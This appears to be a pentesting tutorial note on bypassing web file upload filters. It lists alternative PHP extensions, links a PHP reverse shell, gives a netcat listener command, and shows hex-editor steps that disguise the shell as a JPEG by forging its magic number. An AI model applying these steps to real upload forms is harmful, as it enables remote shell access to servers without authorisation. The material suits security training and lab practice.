### Files referenced within document:
1) **PHP Shell:** Pentest Monkey reverse shell [Link](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
	 * Before running shell make sure to have netcat listener set up to connect:
		`$ nc -lvnp 1234`
2) **List of file extentions with thier magic number:** [link](https://en.wikipedia.org/wiki/List_of_file_signatures)

# Bypassing File Upload Filtering
## Extension Validation
A method of validation there files are checked by their file extentions by compairng them against a whitelist or blacklist.

To bypass try changing to a different file exstention, for example
- if filename.php is blocked try: 
	-   .phtml
	-   .php3
	-   .php4
	-   .php5
	-   .phps

## Magic Numbers
Magic numbers can be used as a more accurate identifier of files. The magic number of a file is a string of hex digits, located within the first line of a file. Exploiting server-side filtering with magic numbers allows us to use magic numbers to validate file uploads by changing the first few bytes of a file we can upload a malicius .php file as a .jpg image allowing us to bypass a whitelist or a blacklist.

Referencing [list of file signatures on Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) we see there are several possible magic numbers of JPEG files, example: `FF D8 FF DB`

1) Check the file type of your shell: `$ file shell.php`
	* Should recieve a simular output to:
		`shell.php: PHP script, ASCII text`
		As expected, the command tells us that the filetype is PHP

2) open up the reverse shell script and add four random characters on the first line: <br>`$ nano shell.php`
	* First three lines of your file should look simular to:
		```
		AAAA
		<?php
		// php-reverse-shell - A Reverse Shell implementation in PHP`
		```
	
	* ***TIP:** Add the number of A's = to the number of hex you will change to aviod breaking the shell code.

3) Save the file and exit. Next we're going to reopen the file in `hexeditor` (which comes by default on Kali): `$ hexeditor shell.php`
	* First line should look simular to:
		`00000000  41 41 41 41  0A 3C 3F 70   68 70 0A 2F  2F 20 70 68`
	* Note the four bytes in the red box: they are all `41`, which is the hex code for a capital "A" -- exactly what we added at the top of the file previously.
	* Change this to the magic number we found earlier for JPEG files: `FF D8 FF DB`
		`00000000  FF D8 FF DB  0A 3C 3F 70   68 70 0A 2F  2F 20 70 68`
	* Now when we do `file` we can see that we have spoofed the PHP to JPEG
		```
		$ file shell.php
		shell.php: JPEG image data
		```
